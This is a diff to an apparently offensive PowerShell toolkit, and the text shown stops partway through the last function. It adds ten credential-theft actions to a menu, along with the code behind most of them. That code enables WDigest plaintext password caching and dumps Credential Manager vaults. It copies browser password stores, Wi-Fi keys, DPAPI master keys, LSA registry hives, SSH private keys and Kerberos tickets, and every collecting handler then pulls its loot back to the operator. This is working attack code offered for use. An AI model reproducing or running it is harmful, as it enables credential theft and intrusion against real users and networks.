@@ -686,6 +686,16 @@ function Get-ARActionCatalog {
     $items.Add((New-ARAction -Id '204' -Title (Get-ARText 'txt59' 'Recover Wi-Fi passwords') -Description (Get-ARText 'txt103' 'Show the keys of saved WiFi networks in clear text') -Handler 'Invoke-ARModuleWifiKeys'))
     $items.Add((New-ARAction -Id '205' -Title (Get-ARText 'txt163' 'Lsass dump') -Description 'Dump LSASS memory with comsvcs.dll and pull the minidump back to the operator' -Handler 'Invoke-ARAttackLsassDump' -NeedsSession $true))
     $items.Add((New-ARAction -Id '206' -Title (Get-ARText 'txt164' 'Sam dump') -Description 'Save the SAM, SYSTEM and SECURITY hives with reg save and pull them back' -Handler 'Invoke-ARAttackSamDump' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '220' -Title (Get-ARText 'txt184' 'WDigest plaintext logon') -Description 'Set UseLogonCredential under WDigest so the next logon leaves the password in memory' -Handler 'Invoke-ARAttackWdigest' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '221' -Title (Get-ARText 'txt185' 'Credential Manager vault') -Description 'List and export the Credential Manager entries of the current user with vaultcmd' -Handler 'Invoke-ARAttackVaultDump' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '222' -Title (Get-ARText 'txt186' 'Browser saved passwords') -Description 'Copy Chrome and Edge Login Data and Local State and pull them for offline decryption' -Handler 'Invoke-ARAttackBrowserCredentials' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '223' -Title (Get-ARText 'txt187' 'Wi-Fi keys in clear') -Description 'Dump every saved wireless profile with key=clear and store the output as loot' -Handler 'Invoke-ARAttackWifiKeys' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '224' -Title (Get-ARText 'txt188' 'DPAPI master keys') -Description 'Copy the user and machine DPAPI master keys, zip them and pull the archive' -Handler 'Invoke-ARAttackDpapiMasterKeys' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '225' -Title (Get-ARText 'txt189' 'LSA secrets (SECURITY hive)') -Description 'Save the SECURITY and SYSTEM hives for an offline secretsdump and pull them' -Handler 'Invoke-ARAttackLsaSecrets' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '226' -Title (Get-ARText 'txt190' 'SSH private keys') -Description 'Collect id_*, *.pem, known_hosts and config from every profile into one archive' -Handler 'Invoke-ARAttackSshKeys' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '227' -Title (Get-ARText 'txt191' 'Kerberos ticket cache') -Description 'Dump the Kerberos ticket cache of the logged-on user with klist and save it to loot' -Handler 'Invoke-ARAttackKerberosTickets' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '228' -Title (Get-ARText 'txt192' 'Token privileges') -Description 'Show whoami /priv and /groups and flag SeImpersonate, SeDebug, SeBackup, SeRestore and SeTakeOwnership' -Handler 'Invoke-ARAttackTokenPrivileges' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '229' -Title (Get-ARText 'txt193' 'Cached domain logons') -Description 'Read the cached logon count from Winlogon and report whether cached credentials exist' -Handler 'Invoke-ARAttackCachedLogons' -NeedsSession $false))
 
     $items.Add((New-ARGroup -Title (Get-ARText 'txt125' 'Networking / Pivoting') -Description (Get-ARText 'txt141' 'Scan, forward ports, serve files and spray credentials')))
     $items.Add((New-ARAction -Id '301' -Title 'TCP Port Scan' -Description (Get-ARText 'txt104' 'Multi-threaded TCP port scan of the target') -Handler 'Invoke-ARModulePortScan' -NeedsSession $false))
@@ -5730,6 +5740,577 @@ for ($i = 0; $i -lt 288; $i++) {
     catch { Write-ARWarn ('WMI subscription could not be created: ' + $_.Exception.Message) }
 
     Set-ARStatus 'Persistence kit installed' 'Ok'
+}
+
+function Invoke-ARAttackWdigest {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WDigest credential caching'
+    $session = Get-ARTargetSession
+    $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
+    $result = Invoke-ARRemote -Session $session -ArgumentList $keyPath -ScriptBlock {
+        param($path)
+        $entry = [pscustomobject]@{
+            KeyPath = $path
+            Name    = 'UseLogonCredential'
+            Existed = $false
+            Value   = $null
+            Kind    = 'DWord'
+        }
+        if (-not (Test-Path -LiteralPath $path)) { New-Item -Path $path -Force -ErrorAction Stop | Out-Null }
+        try {
+            $key = Get-Item -LiteralPath $path -ErrorAction Stop
+            if (@($key.GetValueNames()) -contains 'UseLogonCredential') {
+                $entry.Existed = $true
+                $entry.Value = $key.GetValue('UseLogonCredential', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
+                $entry.Kind = [string]$key.GetValueKind('UseLogonCredential')
+            }
+        }
+        catch { }
+        New-ItemProperty -Path $path -Name 'UseLogonCredential' -Value 1 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
+        $current = (Get-ItemProperty -Path $path -Name 'UseLogonCredential' -ErrorAction Stop).UseLogonCredential
+        return [pscustomobject]@{ Previous = $entry; Current = [int]$current }
+    }
+    foreach ($entry in @($result.Previous)) {
+        if (-not $entry) { continue }
+        # Oldest snapshot wins: a second run must not record the value it just wrote.
+        $known = $false
+        foreach ($existing in $script:ARRegistryBackup) {
+            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
+        }
+        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
+    }
+    $before = 'not set'
+    if ($result.Previous.Existed) { $before = [string]$result.Previous.Value }
+    Write-ARInfo ('WDigest UseLogonCredential: ' + $before + ' -> ' + [string]$result.Current)
+    Write-ARSuccess 'WDigest plaintext caching enabled and registered for restore.'
+    Write-ARWarn 'UseLogonCredential only covers logons made after the change; credentials cached earlier stay hashed until the next interactive logon.'
+    Set-ARStatus 'WDigest plaintext caching enabled' 'Ok'
+}
+
+function Invoke-ARAttackVaultDump {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Credential vault dump'
+    $session = Get-ARTargetSession
+    $vaults = @('Windows Credentials', 'Web Credentials', 'Certificate Credentials')
+    $lines = New-Object System.Collections.Generic.List[string]
+    foreach ($vault in $vaults) {
+        $result = Invoke-ARRemote -Session $session -ArgumentList $vault -ScriptBlock {
+            param($name)
+            try {
+                $output = & vaultcmd.exe ('/listcreds:"' + $name + '"') /all 2>&1
+                $code = $LASTEXITCODE
+            }
+            catch {
+                $output = @($_.Exception.Message)
+                $code = -1
+            }
+            return [pscustomobject]@{ ExitCode = $code; Text = (($output | Out-String).Trim()) }
+        }
+        $code = [int]$result.ExitCode
+        $text = [string]$result.Text
+        Write-ARInfo ('vaultcmd /listcreds:"' + $vault + '" /all -> exit ' + [string]$code)
+        if ($code -ne 0 -and -not [string]::IsNullOrWhiteSpace($text)) { Write-ARWarn ('Vault ' + $vault + ': ' + $text) }
+        $lines.Add('=== ' + $vault + ' (exit ' + [string]$code + ') ===')
+        if ([string]::IsNullOrWhiteSpace($text)) { $lines.Add('(no entries)') }
+        else {
+            $lines.Add($text)
+            Write-Host $text -ForegroundColor Gray
+        }
+    }
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $localFile = Join-Path (Get-ARLootDirectory 'vault') ('vault-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
+    [System.IO.File]::WriteAllText($localFile, ($lines -join "`r`n"), [System.Text.Encoding]::UTF8)
+    Write-ARSuccess ('Vault report saved to ' + $localFile)
+    Set-ARStatus 'Credential vault dumped' 'Ok'
+}
+
+function Invoke-ARAttackBrowserCredentials {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Browser credential collection'
+    $session = Get-ARTargetSession
+    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
+    $script:ARRemoteTempDirs.Add($remoteDirectory)
+    $remoteZip = Join-Path $remoteDirectory 'browser-credentials.zip'
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $localZip = Join-Path (Get-ARLootDirectory 'browser') ($safeTarget + '-browser-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
+    try {
+        $summary = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteZip -ScriptBlock {
+            param($directory, $archive)
+            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
+            $staging = Join-Path $directory 'staging'
+            New-Item -ItemType Directory -Path $staging -Force -ErrorAction Stop | Out-Null
+            $roots = New-Object System.Collections.Generic.List[object]
+            $usersRoot = Join-Path $env:SystemDrive 'Users'
+            try {
+                foreach ($userRoot in @(Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction Stop)) {
+                    $roots.Add([pscustomobject]@{ Browser = 'Chrome'; User = $userRoot.Name; Path = (Join-Path $userRoot.FullName 'AppData\Local\Google\Chrome\User Data') })
+                    $roots.Add([pscustomobject]@{ Browser = 'Edge'; User = $userRoot.Name; Path = (Join-Path $userRoot.FullName 'AppData\Local\Microsoft\Edge\User Data') })
+                }
+            }
+            catch { }
+            $copied = New-Object System.Collections.Generic.List[string]
+            foreach ($root in $roots) {
+                if (-not (Test-Path -LiteralPath $root.Path)) { continue }
+                $localState = Join-Path $root.Path 'Local State'
+                if (Test-Path -LiteralPath $localState) {
+                    $destination = Join-Path $staging ($root.Browser + '-' + $root.User + '-Local State')
+                    Copy-Item -LiteralPath $localState -Destination $destination -Force -ErrorAction SilentlyContinue
+                    if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
+                }
+                foreach ($profile in @(Get-ChildItem -LiteralPath $root.Path -Directory -ErrorAction SilentlyContinue)) {
+                    $loginData = Join-Path $profile.FullName 'Login Data'
+                    if (-not (Test-Path -LiteralPath $loginData)) { continue }
+                    $destination = Join-Path $staging ($root.Browser + '-' + $root.User + '-' + $profile.Name + '-Login Data')
+                    Copy-Item -LiteralPath $loginData -Destination $destination -Force -ErrorAction SilentlyContinue
+                    if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
+                    if ($copied.Count -ge 512) { break }
+                }
+                if ($copied.Count -ge 512) { break }
+            }
+            if ($copied.Count -eq 0) { return [pscustomobject]@{ FileCount = 0; Bytes = 0 } }
+            Compress-Archive -Path (Join-Path $staging '*') -DestinationPath $archive -Force -ErrorAction Stop
+            return [pscustomobject]@{ FileCount = $copied.Count; Bytes = [int64](Get-Item -LiteralPath $archive -ErrorAction Stop).Length }
+        }
+        if ([int]$summary.FileCount -eq 0) {
+            Write-ARWarn 'No Chrome or Edge credential store was found in any user profile.'
+            Set-ARStatus 'Browser credential collection: nothing found' 'Warn'
+            return
+        }
+        Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
+        $megabytes = [Math]::Round((Get-Item -LiteralPath $localZip -ErrorAction Stop).Length / 1MB, 2)
+        Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + [string]$summary.FileCount + ' files, ' + [string]$megabytes + ' MB)')
+        Write-ARInfo 'Offline decryption needs the DPAPI master keys: per user %APPDATA%\Microsoft\Protect\<SID>\<GUID> and the machine keys (action 224 collects both). The Local State file holds the encrypted v80+ key.'
+        Set-ARStatus 'Browser credentials collected' 'Ok'
+    }
+    finally {
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
+                param($path)
+                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+    }
+}
+
+function Invoke-ARAttackWifiKeys {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WiFi key recovery'
+    $session = Get-ARTargetSession
+    $result = Invoke-ARRemote -Session $session -ScriptBlock {
+        $profiles = New-Object System.Collections.Generic.List[string]
+        try {
+            $listing = @(& netsh.exe wlan show profiles 2>&1 | ForEach-Object { [string]$_ })
+        }
+        catch { return ('netsh wlan show profiles failed: ' + $_.Exception.Message) }
+        foreach ($line in $listing) {
+            $separator = $line.LastIndexOf(':')
+            if ($separator -lt 0) { continue }
+            $name = $line.Substring($separator + 1).Trim()
+            if ($name -eq '') { continue }
+            if ($profiles.Contains($name)) { continue }
+            $profiles.Add($name)
+            if ($profiles.Count -ge 256) { break }
+        }
+        if ($profiles.Count -eq 0) { return 'No wireless profile is configured on the target.' }
+        $lines = New-Object System.Collections.Generic.List[string]
+        $lines.Add('=== netsh wlan show profiles ===')
+        foreach ($line in $listing) { $lines.Add($line) }
+        foreach ($name in @($profiles.ToArray())) {
+            $lines.Add('')
+            $lines.Add('=== ' + $name + ' ===')
+            try {
+                foreach ($line in @(& netsh.exe wlan show profile ('name="' + $name + '"') key=clear 2>&1 | ForEach-Object { [string]$_ })) { $lines.Add($line) }
+            }
+            catch { $lines.Add('netsh wlan show profile failed: ' + $_.Exception.Message) }
+        }
+        return ($lines -join "`r`n")
+    }
+    $text = [string]$result
+    if (-not [string]::IsNullOrWhiteSpace($text)) { Write-Host $text -ForegroundColor Gray }
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $localFile = Join-Path (Get-ARLootDirectory 'wifi') ('wifi-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
+    [System.IO.File]::WriteAllText($localFile, $text, [System.Text.Encoding]::UTF8)
+    Write-ARSuccess ('WiFi report saved to ' + $localFile)
+    Set-ARStatus 'WiFi keys recovered' 'Ok'
+}
+
+function Invoke-ARAttackDpapiMasterKeys {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'DPAPI master key collection'
+    $session = Get-ARTargetSession
+    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
+    $script:ARRemoteTempDirs.Add($remoteDirectory)
+    $remoteZip = Join-Path $remoteDirectory 'dpapi-master-keys.zip'
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $localZip = Join-Path (Get-ARLootDirectory 'dpapi') ($safeTarget + '-dpapi-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
+    try {
+        $summary = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteZip -ScriptBlock {
+            param($directory, $archive)
+            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
+            $staging = Join-Path $directory 'staging'
+            New-Item -ItemType Directory -Path $staging -Force -ErrorAction Stop | Out-Null
+            $copied = New-Object System.Collections.Generic.List[string]
+            $usersRoot = Join-Path $env:SystemDrive 'Users'
+            foreach ($userRoot in @(Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction SilentlyContinue)) {
+                $protect = Join-Path $userRoot.FullName 'AppData\Roaming\Microsoft\Protect'
+                if (-not (Test-Path -LiteralPath $protect)) { continue }
+                foreach ($sidDirectory in @(Get-ChildItem -LiteralPath $protect -Directory -ErrorAction SilentlyContinue)) {
+                    foreach ($file in @(Get-ChildItem -LiteralPath $sidDirectory.FullName -File -ErrorAction SilentlyContinue)) {
+                        $destination = Join-Path $staging ('user-' + $userRoot.Name + '-' + $sidDirectory.Name + '-' + $file.Name)
+                        Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
+                        if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
+                        if ($copied.Count -ge 2048) { break }
+                    }
+                    if ($copied.Count -ge 2048) { break }
+                }
+                if ($copied.Count -ge 2048) { break }
+            }
+            $machineRoot = Join-Path $env:SystemRoot 'System32\Microsoft\Protect'
+            if (Test-Path -LiteralPath $machineRoot) {
+                foreach ($sidDirectory in @(Get-ChildItem -LiteralPath $machineRoot -Directory -ErrorAction SilentlyContinue)) {
+                    foreach ($file in @(Get-ChildItem -LiteralPath $sidDirectory.FullName -File -ErrorAction SilentlyContinue)) {
+                        $destination = Join-Path $staging ('machine-' + $sidDirectory.Name + '-' + $file.Name)
+                        Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
+                        if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
+                        if ($copied.Count -ge 2048) { break }
+                    }
+                    if ($copied.Count -ge 2048) { break }
+                }
+            }
+            if ($copied.Count -eq 0) { return [pscustomobject]@{ FileCount = 0; Bytes = 0 } }
+            Compress-Archive -Path (Join-Path $staging '*') -DestinationPath $archive -Force -ErrorAction Stop
+            return [pscustomobject]@{ FileCount = $copied.Count; Bytes = [int64](Get-Item -LiteralPath $archive -ErrorAction Stop).Length }
+        }
+        if ([int]$summary.FileCount -eq 0) {
+            Write-ARWarn 'No DPAPI master key file could be read; other profiles need local admin or SYSTEM.'
+            Set-ARStatus 'DPAPI master keys: nothing collected' 'Warn'
+            return
+        }
+        Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
+        Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + [string]$summary.FileCount + ' key files)')
+        Write-ARInfo 'Files are named user-<profile>-<SID>-<GUID> and machine-<SID>-<GUID>; decrypt with the matching user password or domain backup key.'
+        Set-ARStatus 'DPAPI master keys collected' 'Ok'
+    }
+    finally {
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
+                param($path)
+                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+    }
+}
+
+function Invoke-ARAttackLsaSecrets {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'LSA secrets dump'
+    $session = Get-ARTargetSession
+    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    try {
+        Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
+            param($path)
+            if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
+        } | Out-Null
+        $savedHives = New-Object System.Collections.Generic.List[string]
+        foreach ($hive in @('SECURITY', 'SYSTEM')) {
+            $result = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $hive -ScriptBlock {
+                param($path, $name)
+                $output = reg.exe save ('HKLM\' + $name) (Join-Path $path ($name + '.hiv')) /y 2>&1
+                return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
+            }
+            if ($result.ExitCode -ne 0) {
+                Write-ARWarn ($hive + ' hive was not saved: ' + [string]$result.Output)
+                continue
+            }
+            $savedHives.Add($hive)
+        }
+        if ($savedHives.Count -eq 0) { throw 'Neither the SECURITY nor the SYSTEM hive could be saved on the target.' }
+        $localDirectory = Join-Path (Get-ARLootDirectory 'lsa') ($safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss'))
+        foreach ($hive in @($savedHives.ToArray())) {
+            $remoteFile = Join-Path $remoteDirectory ($hive + '.hiv')
+            $localFile = Join-Path $localDirectory ($hive + '.hiv')
+            Receive-ARFileFromTarget -RemotePath $remoteFile -LocalPath $localFile -Session $session | Out-Null
+            Write-ARSuccess ($hive + ' hive saved to ' + $localFile)
+        }
+        Write-ARInfo 'Both hives belong together: secretsdump reads the LSA secrets from SECURITY with the boot key from SYSTEM, then the SAM hashes.'
+        Set-ARStatus 'LSA secrets saved' 'Ok'
+        return $localDirectory
+    }
+    finally {
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
+                param($path)
+                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+    }
+}
+
+function Invoke-ARAttackSshKeys {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SSH key collection'
+    $session = Get-ARTargetSession
+    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
+    $script:ARRemoteTempDirs.Add($remoteDirectory)
+    $remoteZip = Join-Path $remoteDirectory 'ssh-keys.zip'
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $localZip = Join-Path (Get-ARLootDirectory 'ssh') ($safeTarget + '-ssh-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
+    try {
+        $summary = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteZip -ScriptBlock {
+            param($directory, $archive)
+            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
+            $staging = Join-Path $directory 'staging'
+            New-Item -ItemType Directory -Path $staging -Force -ErrorAction Stop | Out-Null
+            $copied = New-Object System.Collections.Generic.List[string]
+            $usersRoot = Join-Path $env:SystemDrive 'Users'
+            foreach ($userRoot in @(Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction SilentlyContinue)) {
+                $sshDirectory = Join-Path $userRoot.FullName '.ssh'
+                if (Test-Path -LiteralPath $sshDirectory) {
+                    foreach ($file in @(Get-ChildItem -LiteralPath $sshDirectory -File -ErrorAction SilentlyContinue)) {
+                        $name = $file.Name
+                        $wanted = $false
+                        if ($name -like 'id_*') { $wanted = $true }
+                        elseif ($name -like '*.pem') { $wanted = $true }
+                        elseif ($name -eq 'known_hosts' -or $name -eq 'config') { $wanted = $true }
+                        if (-not $wanted) { continue }
+                        if ($file.Length -gt 1048576) { continue }
+                        $destination = Join-Path $staging ($userRoot.Name + '-ssh-' + $file.Name)
+                        Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
+                        if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
+                        if ($copied.Count -ge 512) { break }
+                    }
+                }
+                if ($copied.Count -ge 512) { break }
+                foreach ($file in @(Get-ChildItem -LiteralPath $userRoot.FullName -File -Filter '*.pem' -ErrorAction SilentlyContinue)) {
+                    if ($file.Length -gt 1048576) { continue }
+                    $destination = Join-Path $staging ($userRoot.Name + '-pem-' + $file.Name)
+                    Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
+                    if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
+                    if ($copied.Count -ge 512) { break }
+                }
+                if ($copied.Count -ge 512) { break }
+            }
+            if ($copied.Count -eq 0) { return [pscustomobject]@{ FileCount = 0; Bytes = 0 } }
+            Compress-Archive -Path (Join-Path $staging '*') -DestinationPath $archive -Force -ErrorAction Stop
+            return [pscustomobject]@{ FileCount = $copied.Count; Bytes = [int64](Get-Item -LiteralPath $archive -ErrorAction Stop).Length }
+        }
+        if ([int]$summary.FileCount -eq 0) {
+            Write-ARWarn 'No SSH material was found in any user profile.'
+            Set-ARStatus 'SSH key collection: nothing found' 'Warn'
+            return
+        }
+        Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
+        Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + [string]$summary.FileCount + ' files)')
+        Write-ARInfo 'Originals were left untouched: only the staging copies were zipped, and the staging folder is removed on exit.'
+        Set-ARStatus 'SSH keys collected' 'Ok'
+    }
+    finally {
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
+                param($path)
+                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+    }
+}
+
+function Invoke-ARAttackKerberosTickets {
+    param([string]$Session = '')
+
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Kerberos ticket cache'
+    $session = Get-ARTargetSession
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $lootDirectory = Get-ARLootDirectory 'kerberos'
+    $localFile = Join-Path $lootDirectory ('klist-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
+    if ([string]::IsNullOrWhiteSpace($Session)) {
+        $result = Invoke-ARRemote -Session $session -ScriptBlock {
+            $lines = New-Object System.Collections.Generic.List[string]
+            foreach ($extra in @(@(), @('-k'))) {
+                $label = 'klist'
+                if (@($extra).Count -gt 0) { $label = 'klist -k' }
+                $lines.Add('=== ' + $label + ' ===')
+                try {
+                    $output = & klist.exe @extra 2>&1
+                    $code = $LASTEXITCODE
+                }
+                catch {
+                    $output = @($_.Exception.Message)
+                    $code = -1
+                }
+                $lines.Add('(exit ' + [string]$code + ')')
+                $lines.Add((($output | Out-String).Trim()))
+            }
+            return ($lines -join "`r`n")
+        }
+        [System.IO.File]::WriteAllText($localFile, [string]$result, [System.Text.Encoding]::UTF8)
+        Write-ARSuccess ('Kerberos ticket cache of the remote account saved to ' + $localFile)
+        Write-ARInfo 'Over WinRM this is the network logon cache, usually empty. Pass -Session <id> to read an interactive logon session instead.'
+        Set-ARStatus 'Kerberos ticket cache dumped' 'Ok'
+        return
+    }
+    if ($Session -notmatch '^\d+$') { throw 'Session must be a numeric session id.' }
+
+    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
+    $script:ARRemoteTempDirs.Add($remoteDirectory)
+    $remoteFile = Join-Path $remoteDirectory 'klist.txt'
+    $taskName = 'AutoRDPwnK' + (New-ARModuleToken -Length 6)
+    try {
+        $userName = [string](Invoke-ARRemote -Session $session -ArgumentList $Session -ScriptBlock {
+            param($sessionId)
+            $user = ''
+            foreach ($line in @(& query.exe session 2>&1 | ForEach-Object { [string]$_ })) {
+                $text = $line.Trim()
+                if ($text -eq '') { continue }
+                $tokens = @($text -split '\s+')
+                for ($index = 1; $index -lt $tokens.Count; $index++) {
+                    if ($tokens[$index] -ne $sessionId) { continue }
+                    if ($index -ge 2) { $user = $tokens[$index - 1] }
+                    break
+                }
+                if ($user -ne '') { break }
+            }
+            return $user
+        })
+        if ([string]::IsNullOrWhiteSpace($userName)) { throw ('No interactive user is attached to session ' + $Session + ' on the target.') }
+        Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteFile, $taskName, $userName -ScriptBlock {
+            param($directory, $report, $name, $user)
+            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
+            $arguments = '/c klist > "' + $report + '" 2>&1 & klist -k >> "' + $report + '" 2>&1'
+            $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument $arguments
+            $principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Limited
+            Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
+            Start-ScheduledTask -TaskName $name -ErrorAction Stop
+        } | Out-Null
+        $script:ARRemoteTasks.Add($taskName)
+        $text = ''
+        $deadline = [DateTime]::UtcNow.AddSeconds(30)
+        while ([DateTime]::UtcNow -lt $deadline) {
+            Start-Sleep -Milliseconds 500
+            $text = [string](Invoke-ARRemote -Session $session -ArgumentList $remoteFile -ScriptBlock {
+                param($path)
+                if (-not (Test-Path -LiteralPath $path)) { return '' }
+                try { return (Get-Content -LiteralPath $path -Raw -ErrorAction Stop) } catch { return '' }
+            })
+            if (-not [string]::IsNullOrWhiteSpace($text)) { break }
+        }
+        if ([string]::IsNullOrWhiteSpace($text)) { throw ('klist produced no output in session ' + $Session + ' within 30 seconds.') }
+        [System.IO.File]::WriteAllText($localFile, $text, [System.Text.Encoding]::UTF8)
+        Write-ARSuccess ('Kerberos ticket cache of session ' + $Session + ' (' + $userName + ') saved to ' + $localFile)
+        Set-ARStatus 'Kerberos ticket cache dumped' 'Ok'
+    }
+    finally {
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $taskName -ScriptBlock {
+                param($name)
+                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+        [void]$script:ARRemoteTasks.Remove($taskName)
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
+                param($path)
+                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+    }
+}
+
+function Invoke-ARAttackTokenPrivileges {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Token privilege enumeration'
+    $session = Get-ARTargetSession
+    $result = Invoke-ARRemote -Session $session -ScriptBlock {
+        $privileges = @()
+        $privilegeExit = 0
+        $groups = @()
+        try {
+            $privileges = @(& whoami.exe /priv 2>&1 | ForEach-Object { [string]$_ })
+            $privilegeExit = $LASTEXITCODE
+        }
+        catch { $privilegeExit = -1 }
+        try {
+            $groups = @(& whoami.exe /groups 2>&1 | ForEach-Object { [string]$_ })
+        }
+        catch { }
+        return [pscustomobject]@{ Privileges = $privileges; PrivilegeExit = $privilegeExit; Groups = $groups }
+    }
+    $wanted = @(
+        'SeImpersonatePrivilege',
+        'SeDebugPrivilege',
+        'SeBackupPrivilege',
+        'SeRestorePrivilege',
+        'SeTakeOwnershipPrivilege'
+    )
+    Write-ARInfo ('Token privileges for ' + $target + ':')
+    foreach ($name in $wanted) {
+        $line = ''
+        foreach ($candidate in @($result.Privileges)) {
+            if ([string]$candidate -match ('^\s*' + [regex]::Escape($name) + '\b')) { $line = ([string]$candidate).Trim(); break }
+        }
+        if ($line -eq '') { Write-ARWarn ($name + ': not held') }
+        else { Write-ARSuccess ($name + ': held -> ' + $line) }
+    }
+    Write-ARInfo ('whoami /priv exit code: ' + [string]$result.PrivilegeExit)
+    Write-Host '--- whoami /priv ---' -ForegroundColor DarkGray
+    foreach ($line in @($result.Privileges)) { Write-Host ([string]$line) -ForegroundColor Gray }
+    Write-Host '--- whoami /groups ---' -ForegroundColor DarkGray
+    foreach ($line in @($result.Groups)) { Write-Host ([string]$line) -ForegroundColor Gray }
